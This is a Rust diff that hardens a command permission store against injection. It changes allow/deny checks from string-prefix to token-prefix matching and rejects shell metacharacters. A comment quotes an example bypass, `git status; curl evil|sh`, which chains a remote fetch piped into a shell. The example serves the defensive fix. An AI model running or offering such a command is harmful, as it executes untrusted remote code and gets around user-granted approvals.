@@ -3,6 +3,33 @@ use serde::{Deserialize, Serialize};
 use std::collections::HashSet;
 use std::path::PathBuf;
 
+// AUDIT-FIX: C-2 — token-prefix match prevents `git status; curl evil|sh` slipping past a `git status` allow.
+fn token_prefix_matches(entry: &str, candidate_tokens: &[&str]) -> bool {
+    let entry_tokens: Vec<&str> = entry.split_whitespace().collect();
+    if entry_tokens.is_empty() || candidate_tokens.len() < entry_tokens.len() {
+        return false;
+    }
+    for (i, etok) in entry_tokens.iter().enumerate() {
+        if candidate_tokens[i] != *etok {
+            return false;
+        }
+    }
+    for tok in &candidate_tokens[entry_tokens.len()..] {
+        if contains_shell_metachar(tok) {
+            return false;
+        }
+    }
+    true
+}
+
+fn contains_shell_metachar(tok: &str) -> bool {
+    let bad_single = [';', '&', '|', '>', '<', '`'];
+    if tok.chars().any(|c| bad_single.contains(&c)) {
+        return true;
+    }
+    tok.contains("$(") || tok.contains("&&") || tok.contains("||")
+}
+
 /// Persistent permission store for command approvals.
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
 pub struct PermissionStore {
@@ -50,22 +77,21 @@ impl PermissionStore {
         Ok(())
     }
 
-    /// Check if a command is permitted (by prefix match against allow/deny lists).
+    /// Check if a command is permitted (by token-prefix match against allow/deny lists).
     /// Returns Some(true) if allowed, Some(false) if denied, None if no match.
     #[allow(dead_code)]
     pub fn check(&self, command: &str) -> Option<bool> {
         let trimmed = command.trim();
+        let candidate_tokens: Vec<&str> = trimmed.split_whitespace().collect(); // AUDIT-FIX: C-2
 
-        // Check deny list first (deny takes precedence).
         for denied in &self.always_deny {
-            if trimmed.starts_with(denied.as_str()) {
+            if token_prefix_matches(denied, &candidate_tokens) {
                 return Some(false);
             }
         }
 
-        // Check allow lists.
         for allowed in self.always_allow.iter().chain(self.session_allow.iter()) {
-            if trimmed.starts_with(allowed.as_str()) {
+            if token_prefix_matches(allowed, &candidate_tokens) {
                 return Some(true);
             }
         }
